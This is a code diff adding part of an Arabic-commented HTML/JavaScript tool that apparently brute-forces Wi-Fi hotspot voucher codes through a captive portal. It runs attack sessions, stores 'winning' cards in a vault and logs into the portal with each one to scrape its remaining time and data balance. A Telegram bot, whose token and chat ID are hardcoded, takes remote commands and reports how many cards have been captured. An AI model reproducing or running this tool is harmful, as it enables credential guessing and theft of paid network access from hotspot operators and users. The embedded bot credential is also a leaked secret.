+        if(!pName) return alert("اختر تكويناً للحذف!");
+        
+        let profiles = JSON.parse(localStorage.getItem('v21_profiles') || "{}");
+        delete profiles[pName];
+        localStorage.setItem('v21_profiles', JSON.stringify(profiles));
+        alert("تم حذف التكوين!");
+        ui.loadProfilesDropdown();
+    },
+
+    // الحفظ التلقائي للجلسة لحمايتها من الإغلاق
+    saveSessionState: function() {
+        const state = {
+            attempts: this.attempts,
+            seqCurrent: this.seqCurrent ? this.seqCurrent.toString() : null,
+            vaultLength: this.vault.length,
+            time: Date.now()
+        };
+        localStorage.setItem('v21_live_session', JSON.stringify(state));
+    },
+    checkUnfinishedSession: function() {
+        const stateStr = localStorage.getItem('v21_live_session');
+        if(stateStr) {
+            const state = JSON.parse(stateStr);
+            // إذا كانت الجلسة محفوظة خلال آخر 15 دقيقة
+            if(Date.now() - state.time < 15 * 60 * 1000 && state.attempts > 0) {
+                if(confirm("تم رصد جلسة عمل غير مكتملة توقفت بشكل مفاجئ.\nهل تريد الاستمرار من حيث توقفت؟")) {
+                    this.attempts = state.attempts;
+                    document.getElementById('statAtt').innerText = this.attempts;
+                    if(state.seqCurrent) this.seqCurrent = BigInt(state.seqCurrent);
+                    logTerminal(`[SYSTEM] تم استرداد بيانات الجلسة السابقة.`);
+                } else {
+                    localStorage.removeItem('v21_live_session');
+                }
+            }
+        }
+    }
+};
+
+// ==========================================
+// واجهة المستخدم وإدارة DOM (الطبقة المحدثة)
+// ==========================================
+const ui = {
+    deletedLogsHTML: "", // مصفوفة/نص استعادة السجل
+    
+    initSessions: function(n) {
+        const host = document.getElementById('viewportHost'); host.innerHTML = '';
+        for(let i=1; i<=n; i++) {
+            host.innerHTML += `
+                <div class="session-card">
+                    <div class="session-info">
+                        <span>S${i}: <b id="sCard-${i}">---</b></span>
+                        <div>
+                            <span id="sPing-${i}">0ms</span> 
+                            <span id="sStatus-${i}" class="health-dot" style="background:gray"></span>
+                            <button class="expand-btn" onclick="ui.expandSession(${i})" title="توسيع النافذة المباشرة">⛶</button>
+                        </div>
+                    </div>
+                    <iframe id="frame-${i}"></iframe>
+                </div>`;
+        }
+    },
+    expandSession: function(id) {
+        const origFrame = document.getElementById(`frame-${id}`);
+        if (!origFrame || !origFrame.src || origFrame.src === "about:blank") {
+            return alert("لا يوجد رابط نشط حالياً في هذه الجلسة");
+        }
+        document.getElementById('expId').innerText = id;
+        document.getElementById('expandFrame').src = origFrame.src;
+        this.openModal('expandModal');
+    },
+    setUrl: function(id, val) {
+        document.getElementById(id).value = val;
+    },
+    updateHUD: function(c, a) { 
+        document.getElementById('mainCardDisplay').innerText = c; 
+        document.getElementById('statAtt').innerText = a; 
+        document.getElementById('hudAtt').innerText = a;
+    },
+    setStatus: function(txt, col) {
+        const s = document.getElementById('statusText');
+        s.innerText = txt; s.style.color = col;
+    },
+    updateSessionUI: function(id, card, col, pingTxt) {
+        const c = document.getElementById(`sCard-${id}`); if(c) c.innerText = card;
+        const s = document.getElementById(`sStatus-${id}`); if(s) s.style.background = col;
+        const p = document.getElementById(`sPing-${id}`); if(p) p.innerText = pingTxt;
+    },
+    log: function(c, sId, st, ping, rep, w=false) {
+        const body = document.getElementById('logBody');
+        
+        // ميزة الحذف التلقائي للسجلات (Auto Clean Logs) لمنع ثقل DOM
+        if (document.getElementById('tglAutoClean').value === 'on') {
+            const limit = parseInt(document.getElementById('autoCleanLimit').value) || 700;
+            while (body.rows.length >= limit) {
+                this.deletedLogsHTML += body.rows[body.rows.length - 1].outerHTML; // تخزين قبل الحذف
+                body.deleteRow(body.rows.length - 1);
+            }
+        }
+
+        const row = body.insertRow(0);
+        if(w) row.className = 'win-row';
+        row.innerHTML = `<td>${c}</td><td>${sId}</td><td>${st}</td><td>${new Date().toLocaleTimeString()}</td><td>${rep}</td><td>${ping}ms</td>`;
+    },
+    filterWins: function() { 
+        let hidden = false;
+        document.querySelectorAll('#logBody tr').forEach(r => { 
+            if(!r.classList.contains('win-row')) { r.classList.toggle('hidden'); hidden = r.classList.contains('hidden'); }
+        }); 
+        alert(hidden ? "تم عرض الناجح فقط" : "تم عرض الكل");
+    },
+    searchLog: function() {
+        const term = prompt("أدخل الكرت للبحث:");
+        if(!term) return;
+        document.querySelectorAll('#logBody tr').forEach(r => {
+            if(r.cells[0].innerText.includes(term)) { r.classList.remove('hidden'); r.style.border = "2px solid yellow"; }
+            else { r.classList.add('hidden'); }
+        });
+    },
+    restoreLogs: function() {
+        if(this.deletedLogsHTML === "") return alert("لا توجد سجلات محذوفة لاستعادتها!");
+        document.getElementById('logBody').innerHTML += this.deletedLogsHTML;
+        this.deletedLogsHTML = "";
+        alert("تم استعادة السجلات المحذوفة للجدول ♻️");
+    },
+    toggleFields: function() {
+        const m = document.getElementById('attackMode').value;
+        document.getElementById('fileGroup').classList.toggle('hidden', m !== 'file');
+        document.getElementById('fileInfo').classList.toggle('hidden', m !== 'file');
+        document.getElementById('maskGroup').classList.toggle('hidden', m !== 'mask');
+        document.getElementById('strictGroup').classList.toggle('hidden', m !== 'strict');
+    },
+    toggleHUD: function() {
+        const main = document.getElementById('mainUI');
+        const hud = document.getElementById('floatingHUD');
+        const rest = document.getElementById('restoreBtn');
+        if(main.style.display === 'none') {
+            main.style.display = 'block'; hud.style.display = 'none'; rest.style.display = 'none';
+        } else {
+            main.style.display = 'none'; hud.style.display = 'block'; rest.style.display = 'block';
+        }
+    },
+    toggleAmoled: function() {
+        const isChecked = document.getElementById('tglAmoled').checked;
+        localStorage.setItem('amoled', isChecked);
+        if(isChecked) document.body.classList.add('amoled-mode');
+        else document.body.classList.remove('amoled-mode');
+    },
+    showVault: function() {
+        document.getElementById('vCap').innerText = document.getElementById('vaultLimit').value;
+        document.getElementById('vaultEditor').value = core.vault.map(v => v.card).join("\n");
+        this.openModal('vaultModal');
+    },
+    showPastVault: function() {
+        dbLayer.getAllPastWins((results) => {
+            document.getElementById('pastVaultCount').innerText = results.length;
+            document.getElementById('pastVaultEditor').value = results.map(r => r.card).join("\n");
+            this.openModal('pastVaultModal');
+        });
+    },
+    showProfiles: function() {
+        this.loadProfilesDropdown();
+        this.openModal('profilesModal');
+    },
+    loadProfilesDropdown: function() {
+        let profiles = JSON.parse(localStorage.getItem('v21_profiles') || "{}");
+        let select = document.getElementById('savedProfilesList');
+        select.innerHTML = '<option value="">-- اختر ملفاً لاستدعائه أو حذفه --</option>';
+        for(let key in profiles) {
+            select.innerHTML += `<option value="${key}">${key}</option>`;
+        }
+    },
+    // ميزة Fetch API لخزان الكروت السابقة وتحديث الأرصدة 
+    refreshPastVaultStatus: async function() {
+        const lines = document.getElementById('pastVaultEditor').value.split('\n').map(l=>l.trim()).filter(l=>l);
+        if(lines.length === 0) return alert("لا توجد كروت لفحصها!");
+        
+        alert("بدأ فحص الأرصدة عبر Fetch API... قد يستغرق الأمر بعض الوقت حسب عدد الكروت.");
+        let updatedList = [];
+        
+        for(let card of lines) {
+            try {
+                // إرسال طلب لدخول الكرت بشكل صامت لقرأة الحالة
+                let loginUrl = document.getElementById('urlLogin').value;
+                await fetch(`${loginUrl}?user=${card}&pass=${card}`, {mode: 'no-cors'});
+                
+                // جلب الحالة بعد تسجيل الدخول (يتطلب أن تكون البوابة تسمح للـ Fetch أو أن الرد محلي)
+                let statusUrl = "http://10.0.0.1/status";
+                let res = await fetch(statusUrl);
+                let text = await res.text();
+                
+                let timeLeft = text.match(/الوقت المتبقي[:\s<>]*?([0-9hms\d]+)/i);
+                let dataLeft = text.match(/الرصيد المتبقي[:\s<>]*?((?:MiB|KiB|GiB|MB|KB|GB)\s*[0-9.]+)/i);
+                
+                let info = `[وقت:${timeLeft?timeLeft[1]:'?'} | رصيد:${dataLeft?dataLeft[1]:'?'}]`;
+                updatedList.push(`${card} - ${info}`);
+                
+                // تسجيل خروج للكرت الحالي للفحص التالي
+                await fetch(document.getElementById('urlLogout').value, {mode: 'no-cors'});
+            } catch(e) {
+                updatedList.push(`${card} - [تعذر الفحص (أوفلاين)]`);
+            }
+        }
+        document.getElementById('pastVaultEditor').value = updatedList.join('\n');
+    },
+    openModal: function(id) { 
+        document.getElementById('overlay').style.display = 'block'; 
+        document.getElementById(id).style.display = 'flex'; 
+    },
+    closeModals: function() { 
+        document.getElementById('overlay').style.display = 'none'; 
+        document.querySelectorAll('.modal').forEach(m => {
+            m.style.display = 'none';
+            if (m.id === 'expandModal') document.getElementById('expandFrame').src = 'about:blank';
+        }); 
+    }
+};
+
+// ==========================================
+// رادار تيليجرام (Long Polling)
+// ==========================================
+let lastUpdateId = 0;
+
+async function startTelegramListener() {
+    const TOKEN = "8904110153:AAH_pT9Z_PY0Qz42AqN4dVJKYA1BokVlp6Q";
+    const CHAT_ID = "5818402198";
+    
+    logTerminal("🤖 رادار تيليجرام نشط الآن ويستمع لأوامرك...");
+
+    setInterval(async () => {
+        try {
+            let response = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=2`);
+            let data = await response.json();
+
+            if (data.ok && data.result.length > 0) {
+                for (let update of data.result) {
+                    lastUpdateId = update.update_id; 
+                    
+                    let message = update.message;
+                    if (message && String(message.chat.id) === CHAT_ID && message.text) {
+                        let command = message.text.trim();
+
+                        if (command === "/refresh" || command === "تحديث") {
+                            await sendDirectMessage("🔄 علم! جاري تحديث أرصدة الكروت السابقة المحفوظة الآن...");
+                            ui.refreshPastVaultStatus(); // دالة التحديث السابقة
+                        }
+                        else if (command === "/info" || command === "معلومات") {
+                            dbLayer.getAllPastWins(async (results) => {
+                                let infoMsg = `📊 **إحصائيات خزان الكروت الحالي:**\n\n` +
+                                              `📦 إجمالي الكروت المصيدة والمحفوظة: \`${results.length}\` كرت.\n` +
+                                              `💡 يمكنك إرسال كلمة (تحديث) لإعادة فحص رصيد الكروت.`;
+                                await sendDirectMessage(infoMsg);
+                            });
+                        }
+                    }
+                }
+            }
+        } catch (error) {
+            // صمت للخطأ لمنع إزعاج الـ Console
+        }
+    }, 3000);
+}
+
+async function sendDirectMessage(text) {
+    const TOKEN = "8904110153:AAH_pT9Z_PY0Qz42AqN4dVJKYA1BokVlp6Q";
+    const CHAT_ID = "5818402198";
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+}
+
+// مستمع أمان إضافي للحفظ المباشر عند إغلاق المتصفح عن طريق الخطأ
+window.addEventListener("beforeunload", function (e) {
+    if (core.vault.length > 0) {
+        core.vault.forEach(v => dbLayer.saveWin(v.card));
+    }
+});
+
+// الأحداث عند تحميل الصفحة
+window.addEventListener('load', () => {
+    // تشغيل رادار التليجرام
+    startTelegramListener();
+    
+    // استعادة وضع الـ AMOLED
+    if(localStorage.getItem('amoled') === 'true') {
+        document.getElementById('tglAmoled').checked = true;
+        document.body.classList.add('amoled-mode');
+    }
+    
+    // استعادة وضع الصوت بالخلفية
+    if(localStorage.getItem('bgAudio') === 'true') {
+        document.getElementById('tglBgAudio').checked = true;
+    }
+    
+    // التحقق من وجود جلسة توقفت فجأة
+    core.checkUnfinishedSession();
+});
+
+</script>
+</body>
+</html>
